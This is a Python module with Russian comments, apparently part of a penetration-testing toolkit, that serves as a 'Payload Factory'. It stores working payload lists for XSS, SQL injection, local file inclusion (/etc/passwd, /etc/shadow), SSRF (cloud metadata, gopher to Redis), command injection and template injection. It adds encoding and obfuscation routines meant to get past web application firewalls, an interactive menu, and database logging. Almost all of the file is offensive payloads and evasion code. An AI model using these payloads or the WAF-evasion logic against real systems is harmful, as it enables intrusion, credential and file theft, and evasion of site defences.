"""
Payload Factory: генерация payload'ов для XSS, SQLi, LFI, SSRF, CMDi, SSTI.
Поддерживает кодирование (URL, double-URL, hex, unicode, base64) и
обфускацию для обхода WAF.
"""
import base64
import random
import urllib.parse

from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table

from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)


# ---------------------------------------------------------------------------
# Базовые наборы payload'ов
# ---------------------------------------------------------------------------

XSS_BASE = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
]

SQLI_BASE = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int, @@version)--",
    "' OR 1=1#",
    "admin'--",
    "' OR EXISTS(SELECT * FROM users)--",
]

LFI_BASE = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==",
    "/proc/self/environ",
]

SSRF_BASE = [
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]:80",
    "http://0.0.0.0:80",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/",
    "http://2130706433:80",
    "http://0177.0.0.1:80",
]

CMDI_BASE = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| whoami",
    "; ping -c 1 127.0.0.1",
]

SSTI_BASE = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "{%for x in [].__class__.__base__.__subclasses__()%}{{x}}{%endfor%}",
    "${7*'7'}",
    "*{7*7}",
    "@(7*7)",
]

PAYLOADS = {
    "xss": XSS_BASE,
    "sqli": SQLI_BASE,
    "lfi": LFI_BASE,
    "ssrf": SSRF_BASE,
    "cmdi": CMDI_BASE,
    "ssti": SSTI_BASE,
}


# ---------------------------------------------------------------------------
# Кодирование
# ---------------------------------------------------------------------------

def _encode(payload: str, kind: str) -> str:
    if kind == "none":
        return payload
    if kind == "url":
        return urllib.parse.quote(payload, safe="")
    if kind == "double-url":
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
    if kind == "hex":
        return "".join(f"%{ord(c):02x}" for c in payload)
    if kind == "unicode":
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    if kind == "base64":
        return base64.b64encode(payload.encode()).decode()
    return payload


# ---------------------------------------------------------------------------
# Обфускация для обхода WAF
# ---------------------------------------------------------------------------

def _obfuscate(payload: str, kind: str) -> str:
    """Простая обфускация под конкретный тип payload'а."""
    if kind == "xss":
        # Разбиваем тег с HTML-комментарием, меняем регистр, добавляем \x00
        if "<script>" in payload:
            payload = payload.replace(
                "<script>", "<scr\x00ipt>"
            ).replace(
                "</script>", "</scr\x00ipt>"
            )
        # Случайный регистр для ключевых слов
        for kw in ["script", "alert", "onerror", "onload", "svg", "img"]:
            if kw in payload.lower():
                # случайный case
                idx = payload.lower().find(kw)
                new_kw = "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in payload[idx:idx + len(kw)]
                )
                payload = payload[:idx] + new_kw + payload[idx + len(kw):]
        return payload

    if kind == "sqli":
        # Комментарии внутри SQL, пробелы → /**/
        payload = payload.replace(" ", "/**/")
        payload = payload.replace("OR", "O/**/R")
        payload = payload.replace("UNION", "UN/**/ION")
        payload = payload.replace("SELECT", "SEL/**/ECT")
        return payload

    if kind == "lfi":
        payload = payload.replace("../", "..//")
        payload = payload.replace("etc/passwd", "etc//passwd")
        return payload

    if kind == "cmdi":
        payload = payload.replace(" ", "${IFS}")
        return payload

    return payload


# ---------------------------------------------------------------------------
# Публичный API
# ---------------------------------------------------------------------------

def generate_payloads(kind: str, encode: str = "none", obfuscate: bool = False,
                      count: int = 10) -> list[str]:
    """Вернуть список payload'ов. Печатает таблицу."""
    if kind not in PAYLOADS:
        console.print(f"[red]Неизвестный тип: {kind}[/red]")
        return []

    base = PAYLOADS[kind]
    variants: list[str] = []
    seen: set[str] = set()

    for p in base:
        processed = p
        if obfuscate:
            processed = _obfuscate(processed, kind)
        processed = _encode(processed, encode)
        if processed not in seen:
            seen.add(processed)
            variants.append(processed)

    # Если нужно больше — комбинируем (только для xss/sqli)
    if count > len(variants) and kind in ("xss", "sqli"):
        extras = []
        for p in base:
            for prefix in ("", "'", "\"", "1", "0"):
                for suffix in ("", "--", "#", ";", "/*"):
                    cand = prefix + p + suffix
                    if obfuscate:
                        cand = _obfuscate(cand, kind)
                    cand = _encode(cand, encode)
                    if cand not in seen:
                        seen.add(cand)
                        extras.append(cand)
                        if len(variants) + len(extras) >= count * 3:
                            break
                if len(variants) + len(extras) >= count * 3:
                    break
            if len(variants) + len(extras) >= count * 3:
                break
        variants.extend(extras)

    variants = variants[:count]

    table = Table(title=f"Payloads: {kind} (encode={encode}, "
                        f"obfuscate={obfuscate})")
    table.add_column("#", style="yellow", width=4)
    table.add_column("Payload", style="green")
    for i, p in enumerate(variants, 1):
        table.add_row(str(i), p)
    console.print(table)

    db.save_scan("payload_factory", f"{kind}:{encode}:{obfuscate}",
                 {"count": len(variants),
                  "sample": variants[:5]})
    return variants


def menu() -> None:
    """Меню Payload Factory."""
    table = Table(title="[bold]Payload Factory[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "XSS"),
        ("2", "SQL Injection"),
        ("3", "LFI"),
        ("4", "SSRF"),
        ("5", "Command Injection"),
        ("6", "SSTI"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    kind_map = {"1": "xss", "2": "sqli", "3": "lfi",
                "4": "ssrf", "5": "cmdi", "6": "ssti"}
    kind = kind_map[c]

    encode = Prompt.ask("Кодирование",
                        choices=["none", "url", "double-url", "hex",
                                 "unicode", "base64"], default="none")
    obfuscate = Confirm.ask("Обфускация для обхода WAF?", default=False)
    count = IntPrompt.ask("Сколько payload'ов", default=15)
    generate_payloads(kind, encode, obfuscate, count)